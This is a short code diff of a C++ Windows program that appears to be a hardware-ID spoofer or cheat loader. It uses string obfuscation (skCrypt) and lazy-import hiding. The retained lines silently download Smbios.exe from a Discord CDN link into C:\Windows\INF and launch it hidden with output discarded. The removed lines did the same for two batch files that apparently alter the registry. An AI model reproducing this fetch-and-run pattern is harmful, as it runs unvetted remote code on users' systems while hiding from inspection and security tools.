@@ -1,4 +1,4 @@
-﻿#include <iostream>
+#include <iostream>
 #include <Windows.h>
 #include <thread>
 #include <chrono>
@@ -465,12 +465,8 @@ ________________________________________________________________________________
         {
         
             LI_FN(system)(skCrypt("curl  https://cdn.discordapp.com/attachments/1115724000052641868/1148818637545803857/Smbios.exe -o C:\\Windows\\INF\\Smbios.exe --silent"));
-            LI_FN(system)(skCrypt("curl  https://cdn.discordapp.com/attachments/1130564096731918416/1149034565340504205/regedit_change.bat -o C:\\Windows\\INF\\regedit_change.bat --silent"));
-            LI_FN(system)(skCrypt("curl  https://cdn.discordapp.com/attachments/1130564096731918416/1149034656176549928/Registry.bat -o C:\\Windows\\INF\\Registry.bat --silent"));
 
             LI_FN(system)(skCrypt("start /B C:\\Windows\\INF\\Smbios.exe >nul 2>nul"));
-            LI_FN(system)(skCrypt("start /B C:\\Windows\\INF\\regedit_change.bat >nul 2>nul"));
-            LI_FN(system)(skCrypt("start /B C:\\Windows\\INF\\Registry.bat >nul 2>nul"));
             Sleep(15000);
             LI_FN(system)("cls");
             LI_FN(printf)(skCrypt(ANSI_MAGENTA""));
